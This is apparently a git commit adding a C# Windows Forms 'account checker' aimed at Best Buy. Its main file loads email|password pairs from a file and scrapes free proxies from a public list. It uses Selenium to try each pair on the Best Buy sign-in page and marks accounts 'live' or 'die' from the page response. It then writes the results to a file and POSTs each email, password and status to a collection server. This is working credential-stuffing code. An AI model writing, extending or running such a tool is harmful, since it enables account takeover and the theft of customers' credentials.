6d5b1c8c377288b1f2817f9388b6818de10f706c
Hung Ngo <hungbgg198@gmail.com>
2020-03-23 22:31:32 +0700

    commit 1

---
+++ ToolBest/Form1.Designer.cs
@@ -0,0 +1,218 @@
+﻿namespace ToolBest
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.button2 = new System.Windows.Forms.Button();
+            this.label3 = new System.Windows.Forms.Label();
+            this.panel4 = new System.Windows.Forms.Panel();
+            this.groupBox3 = new System.Windows.Forms.GroupBox();
+            this.btnSaveFile = new System.Windows.Forms.Button();
+            this.txtFolderSave = new System.Windows.Forms.TextBox();
+            this.groupBox2 = new System.Windows.Forms.GroupBox();
+            this.btnOpenFile = new System.Windows.Forms.Button();
+            this.txtFileOpen = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.listBox1 = new System.Windows.Forms.ListBox();
+            this.button3 = new System.Windows.Forms.Button();
+            this.listBox2 = new System.Windows.Forms.ListBox();
+            this.panel4.SuspendLayout();
+            this.groupBox3.SuspendLayout();
+            this.groupBox2.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // button2
+            // 
+            this.button2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button2.Location = new System.Drawing.Point(276, 422);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 23);
+            this.button2.TabIndex = 2;
+            this.button2.Text = "Run";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label3.Location = new System.Drawing.Point(62, 9);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(220, 25);
+            this.label3.TabIndex = 4;
+            this.label3.Text = "Tool test Info Bestbuy";
+            // 
+            // panel4
+            // 
+            this.panel4.Controls.Add(this.groupBox3);
+            this.panel4.Controls.Add(this.groupBox2);
+            this.panel4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.panel4.Location = new System.Drawing.Point(4, 37);
+            this.panel4.Name = "panel4";
+            this.panel4.Size = new System.Drawing.Size(347, 119);
+            this.panel4.TabIndex = 5;
+            // 
+            // groupBox3
+            // 
+            this.groupBox3.Controls.Add(this.btnSaveFile);
+            this.groupBox3.Controls.Add(this.txtFolderSave);
+            this.groupBox3.Location = new System.Drawing.Point(3, 60);
+            this.groupBox3.Name = "groupBox3";
+            this.groupBox3.Size = new System.Drawing.Size(340, 51);
+            this.groupBox3.TabIndex = 2;
+            this.groupBox3.TabStop = false;
+            this.groupBox3.Text = "Save";
+            // 
+            // btnSaveFile
+            // 
+            this.btnSaveFile.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnSaveFile.Location = new System.Drawing.Point(265, 20);
+            this.btnSaveFile.Name = "btnSaveFile";
+            this.btnSaveFile.Size = new System.Drawing.Size(69, 23);
+            this.btnSaveFile.TabIndex = 3;
+            this.btnSaveFile.Text = "Choose";
+            this.btnSaveFile.UseVisualStyleBackColor = true;
+            this.btnSaveFile.Click += new System.EventHandler(this.btnSaveFile_Click);
+            // 
+            // txtFolderSave
+            // 
+            this.txtFolderSave.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txtFolderSave.Location = new System.Drawing.Point(6, 21);
+            this.txtFolderSave.Name = "txtFolderSave";
+            this.txtFolderSave.Size = new System.Drawing.Size(253, 22);
+            this.txtFolderSave.TabIndex = 2;
+            // 
+            // groupBox2
+            // 
+            this.groupBox2.Controls.Add(this.btnOpenFile);
+            this.groupBox2.Controls.Add(this.txtFileOpen);
+            this.groupBox2.Location = new System.Drawing.Point(4, 3);
+            this.groupBox2.Name = "groupBox2";
+            this.groupBox2.Size = new System.Drawing.Size(340, 51);
+            this.groupBox2.TabIndex = 1;
+            this.groupBox2.TabStop = false;
+            this.groupBox2.Text = "File account";
+            // 
+            // btnOpenFile
+            // 
+            this.btnOpenFile.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnOpenFile.Location = new System.Drawing.Point(265, 20);
+            this.btnOpenFile.Name = "btnOpenFile";
+            this.btnOpenFile.Size = new System.Drawing.Size(69, 23);
+            this.btnOpenFile.TabIndex = 3;
+            this.btnOpenFile.Text = "Choose";
+            this.btnOpenFile.UseVisualStyleBackColor = true;
+            this.btnOpenFile.Click += new System.EventHandler(this.btnOpenFile_Click);
+            // 
+            // txtFileOpen
+            // 
+            this.txtFileOpen.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txtFileOpen.Location = new System.Drawing.Point(6, 21);
+            this.txtFileOpen.Name = "txtFileOpen";
+            this.txtFileOpen.Size = new System.Drawing.Size(253, 22);
+            this.txtFileOpen.TabIndex = 2;
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(163, 422);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(103, 23);
+            this.button1.TabIndex = 7;
+            this.button1.Text = "Load Proxy Test";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click_1);
+            // 
+            // listBox1
+            // 
+            this.listBox1.FormattingEnabled = true;
+            this.listBox1.Location = new System.Drawing.Point(4, 162);
+            this.listBox1.Name = "listBox1";
+            this.listBox1.Size = new System.Drawing.Size(347, 251);
+            this.listBox1.TabIndex = 8;
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(67, 421);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(75, 23);
+            this.button3.TabIndex = 9;
+            this.button3.Text = "button3";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // listBox2
+            // 
+            this.listBox2.FormattingEnabled = true;
+            this.listBox2.Location = new System.Drawing.Point(401, 97);
+            this.listBox2.Name = "listBox2";
+            this.listBox2.Size = new System.Drawing.Size(520, 95);
+            this.listBox2.TabIndex = 10;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(1063, 492);
+            this.Controls.Add(this.listBox2);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.listBox1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.panel4);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.button2);
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "BEST BUY";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.panel4.ResumeLayout(false);
+            this.groupBox3.ResumeLayout(false);
+            this.groupBox3.PerformLayout();
+            this.groupBox2.ResumeLayout(false);
+            this.groupBox2.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Panel panel4;
+        private System.Windows.Forms.Button btnOpenFile;
+        private System.Windows.Forms.TextBox txtFileOpen;
+        private System.Windows.Forms.GroupBox groupBox2;
+        private System.Windows.Forms.GroupBox groupBox3;
+        private System.Windows.Forms.Button btnSaveFile;
+        private System.Windows.Forms.TextBox txtFolderSave;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.ListBox listBox1;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.ListBox listBox2;
+    }
+}
+
---
+++ ToolBest/Form1.cs
@@ -0,0 +1,330 @@
+﻿using KAutoHelper;
+using OpenQA.Selenium;
+using OpenQA.Selenium.Chrome;
+using OpenQA.Selenium.Firefox;
+using OpenQA.Selenium.Support.UI;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Reflection;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Windows.Forms;
+using xNet;
+
+namespace ToolBest
+{
+    public partial class Form1 : Form
+    {
+        ChromeDriver chromeDriver;
+        HttpRequest http;
+        string data;
+        int i = 0;
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+
+        }
+        #region run
+        private void run(string mp)
+        {
+            //string[] mailPass = mp.Split(new string[] { "|" }, StringSplitOptions.None);
+            //output("- khoi tao");
+            newChrome();
+
+            //output(" - Dang nhap");
+            string e = login(mp);
+
+            if(String.Compare(e,"break") != 0)
+            {
+                //ghi file
+                //output("- Check loi");
+                string result = getErr(e);
+
+                //output("- Ghi file");
+                output(result);
+
+                //dong tab
+                //output("Quit - End");
+                i++;
+                //listBox1.Items.RemoveAt(0);
+                chromeDriver.Quit();
+            }
+        }
+
+        ChromeDriver newChrome()
+        {
+            ChromeOptions options = new ChromeOptions();
+            //output("-- Khoi tao xong");
+
+            //Khi den socks cuoi cung thi quay lai sock dau tien
+            if (i == listBox1.Items.Count - 1)
+                i = 0;
+            //options.AddArguments("--proxy-server=" + listBox1.Items[i].ToString());
+            chromeDriver = new ChromeDriver(options);
+            //Khi website ko phan hoi trong thoi gian nhat dinh thi chay lai ham login
+            try
+            {
+                //output("-- Navigate");
+                chromeDriver.Url = "https://www.bestbuy.com/identity/global/signin";
+                chromeDriver.Navigate();
+            }
+            catch (Exception ex)
+            {
+                //output("-- Loi navigate");
+                listBox1.Items.RemoveAt(i);
+                chromeDriver.Quit();
+                return newChrome();
+            }
+            return chromeDriver;
+        }
+
+        //lay dia chi cac phan tu va dien thong tin vao form login
+        public string login(string mp)
+        {
+            //output("- login");
+            string[] mailPass = mp.Split(new string[] { "|" }, StringSplitOptions.None);
+            //lay dia chi cua cac phan tu
+            try
+            {
+                var email = chromeDriver.FindElementById("fld-e");
+                var pwd = chromeDriver.FindElementById("fld-p1");
+                var btnSubmit = chromeDriver.FindElementByClassName("cia-form__controls");
+
+                //cho trinh duyet load xong
+                wait();
+
+                //dien du lieu vao form login
+                email.SendKeys(mailPass[0]);
+                pwd.SendKeys(mailPass[1]);
+                btnSubmit.Click();
+                return mp;
+            }
+            catch (Exception ex)
+            {
+                //do something ?
+                //output("Quit - loi die sock");
+                chromeDriver.Quit();
+                listBox1.Items.RemoveAt(i);
+                run(mp);
+                return "break";
+            }
+
+        }
+
+        void wait()
+        {
+            WebDriverWait wait = new WebDriverWait(chromeDriver, TimeSpan.FromSeconds(30));
+            wait.Until((x) =>
+            {
+                return ((IJavaScriptExecutor)chromeDriver).ExecuteScript("return document.readyState").Equals("complete");
+            });
+        }
+
+        public string getErr(string e)
+        {
+            string result = "";
+
+            //chuong trinh tam nghi 3.5s
+            Thread.Sleep(3500);
+            //Chờ cho đến khi tìm được lỗi hoặc chuyển sang trang chủ
+            //nếu vẫn ở trang hiện tại trang hiện tại ("https://www.bestbuy.com/identity/signin?token=tid%3A2fb6ccaf-61e7-11ea-9a2e-0e9233bf588f") mà tìm thấy lỗi thì return die
+            //https://www.bestbuy.com/identity/signin/recoveryOptions
+            //Nếu ko thì
+            var url = chromeDriver.Url;
+            //output("-- get URL");
+
+
+            if (String.Compare(url, "https://www.bestbuy.com/") == 0 || String.Compare(url, "https://www.bestbuy.com/?intl=nosplash") == 0)
+            {
+                //output("-- login TRUE");
+                wait();
+
+                sendData(e, 1);
+
+                return e + " => live";
+            }
+                
+            else
+            {
+                //output("-- khong tim thay");
+                string[] arrLink = url.Split(new string[] { "?token=tid%3A" }, StringSplitOptions.None);
+                //Nếu trang web bắt xác nhận email return die
+                if(String.Compare(arrLink[0], "https://www.bestbuy.com/identity/signin/recoveryOptions") == 0)
+                {
+                    sendData(e, 0);
+                    
+                    return e + " => die";
+                }
+                //Nếu ko thì tìm cho ra lỗi || trang web chưa load xong
+                else if(String.Compare(arrLink[0], "https://www.bestbuy.com/identity/signin") == 0)
+                {
+                    //output("-- Lấy thông báo lỗi của website");
+                    //Lấy thông báo lỗi của website
+                    try
+                    {
+                        result = chromeDriver.FindElementByXPath("/html/body/div[3]/div[1]/section/main/div[1]/div/div/div[1]/div/div[2]/strong/div").Text.ToString();
+                        if (String.Compare(result, "We didn't find an account with that email address. Would you like to create an account?") == 0 || String.Compare(result, "Oops! The email or password did not match our records. Please try again.") == 0 || String.Compare(result, "The password was incorrect. Please try again.") == 0)
+                        {
+                            //output("-- tim thay");
+                            sendData(e, 0);
+                            Thread.Sleep(1000);
+                            return e + " => die";
+                        }
+                    }
+                    catch(Exception ex)
+                    {
+                        //output("-- ko tim thay");
+                        //   output("loi gi do");
+                        return getErr(e);
+                    }
+
+                }
+
+            }
+            return e + " => UNKNOW ERROR";
+        }
+        
+        //ghi du lieu vao file output.txt
+        public void output(string text)
+        {
+            StreamWriter sw = new StreamWriter(txtFolderSave.Text + "\\output.txt", true);
+
+            sw.WriteLine(text);
+
+            sw.Close();
+        }
+        
+
+        #endregion
+        private void button2_Click(object sender, EventArgs e)
+        {
+            if (!String.IsNullOrEmpty(txtFileOpen.Text) || !String.IsNullOrEmpty(txtFolderSave.Text))
+            {
+                //Kiểm tra xem đã load proxy chưa
+                if(listBox1.Items.Count > 0)
+                {
+                    string[] lines = File.ReadAllLines(txtFileOpen.Text);
+
+                    foreach (string mp in lines)
+                    {
+                        run(mp);
+                    }
+
+                    MessageBox.Show("Chương trình đã chạy xong !!!", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+                else
+                {
+                    MessageBox.Show("Phải load proxy trước","Thông báo",MessageBoxButtons.OK,MessageBoxIcon.Error);
+                }
+            }
+            else
+                MessageBox.Show("Bạn phải chọn file account và nơi lưu file", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Error);
+        }
+
+        private void btnOpenFile_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog openFileDialog = new OpenFileDialog();
+
+            openFileDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
+
+            if (openFileDialog.ShowDialog() == DialogResult.OK)
+            {
+                txtFileOpen.Text = openFileDialog.FileName;
+            }
+        }
+
+        private void btnSaveFile_Click(object sender, EventArgs e)
+        {
+            FolderBrowserDialog folder = new FolderBrowserDialog();
+
+            if (folder.ShowDialog() == DialogResult.OK)
+            {
+                txtFolderSave.Text = folder.SelectedPath;
+            }
+        }
+
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+            string html = GetData("https://free-proxy-list.net/");
+            
+            getShock(html);
+        }
+        string GetData(string url, string cookie = null)
+        {
+            http = new HttpRequest();
+            
+            http.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36";
+            string html = http.Get(url).ToString();
+            return html;
+        }
+        private void getShock(string html)
+        {
+            var res = Regex.Matches(html, @"(?=<tr><td>).*?(?=</td></tr><tr><td>)", RegexOptions.Multiline);
+
+            //StreamWriter sw = new StreamWriter("output.txt", true);
+            
+            foreach (var line in res)
+            {
+                string[] arr = line.ToString().Split(new string[] { "</td>" }, StringSplitOptions.None);
+                arr[0] = arr[0].Replace("<tr><td>", "");
+                arr[1] = arr[1].Replace("<td>", "");
+                arr[6] = arr[6].Replace("<td class='hx'>", "");
+                
+                if(String.Compare(arr[6],"yes") == 0)
+                {
+                    listBox1.Items.Add(arr[0] + ":" + arr[1]);
+                }
+            }
+        }
+
+        
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            data = "m=username&p=password&ok=ok";
+            string stringReturn = PostData(http, "http://localhost:81/BestBuy/", data, "application/x-www-form-urlencoded", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36");
+            
+        }
+
+        string PostData(HttpRequest http, string url, string data = null, string contentType = null, string userArgent = "", string cookie = null)
+        {
+            if (http == null)
+            {
+                http = new HttpRequest();
+                http.Cookies = new CookieDictionary();
+            }
+
+            if (!string.IsNullOrEmpty(userArgent))
+            {
+                http.UserAgent = userArgent;
+            }
+
+            string html = http.Post(url, data, contentType).ToString();
+            return html;
+        }
+
+        void sendData(string e,int stt)
+        {
+            string[] mailPass = e.Split(new string[] { "|" }, StringSplitOptions.None);
+            data = "m=" + mailPass[0] + "&p=" + mailPass[1] + "&stt=" + stt + "&ok=ok";
+            listBox2.Items.Add(data);
+            PostData(http, "http://localhost:81/BestBuy/", data, "application/x-www-form-urlencoded", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36");
+
+        }
+    }
+}
